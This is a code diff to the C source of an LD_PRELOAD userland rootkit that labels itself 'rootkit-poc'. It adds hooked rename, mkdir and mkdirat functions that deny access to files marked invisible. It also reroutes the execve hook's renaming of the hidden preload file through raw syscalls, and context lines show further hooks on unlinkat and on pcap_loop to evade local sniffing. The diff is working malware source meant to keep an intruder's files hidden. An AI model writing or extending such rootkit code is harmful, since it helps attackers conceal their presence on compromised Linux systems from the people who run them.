@@ -286,7 +286,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         xor(ld_normal);
         xor(ld_hide);
 
-        rename(ld_normal, ld_hide); // rename the ld file to hide it
+        syscall_list[SYS_RENAME].syscall_func(ld_normal, ld_hide); // rename the ld file to hide it
 
         // Create a new process
         if ((pid = fork()) == -1) {
@@ -304,7 +304,7 @@ int execve(const char *path, char *const argv[], char *const envp[]) {
         }
 
         // Restore the ld
-        rename(ld_hide, ld_normal);
+        syscall_list[SYS_RENAME].syscall_func(ld_hide, ld_normal);
 
         cleanup(ld_normal, strlen(ld_normal));
         cleanup(ld_hide, strlen(ld_hide));
@@ -457,6 +457,45 @@ int unlinkat(int dirfd, const char *pathname, int flags) {
 
     // Calls the original unlinkat function if the path is visible
     return (long) syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
+}
+
+// Hooked rename function to hide invisible files
+int rename(const char *oldpath, const char *newpath) {
+    DEBUG("[rootkit-poc]: rename hooked\n");
+
+    if (is_invisible(oldpath)) {
+        errno = ENOENT;
+        return -1;
+    }
+
+    // Calls the original rename function if the oldpath is visible
+    return (long) syscall_list[SYS_RENAME].syscall_func(oldpath, newpath);
+}
+
+// Hooked mkdir function to hide invisible directories
+int mkdir(const char *pathname, mode_t mode) {
+    DEBUG("[rootkit-poc]: mkdir hooked\n");
+
+    if (is_invisible(pathname)) {
+        errno = EACCES;
+        return -1;
+    }
+
+    // Calls the original mkdir function if the path is visible
+    return (long) syscall_list[SYS_MKDIR].syscall_func(pathname, mode);
+}
+
+// Hooked mkdirat function to hide invisible directories
+int mkdirat(int dirfd, const char *pathname, mode_t mode) {
+    DEBUG("[rootkit-poc]: mkdirat hooked\n");
+
+    if (is_invisible(pathname)) {
+        errno = EACCES;
+        return -1;
+    }
+
+    // Calls the original mkdirat function if the path is visible
+    return (long) syscall_list[SYS_MKDIRAT].syscall_func(dirfd, pathname, mode);
 }
 
 // Hooked pcap_loop function to avoids local sniffing
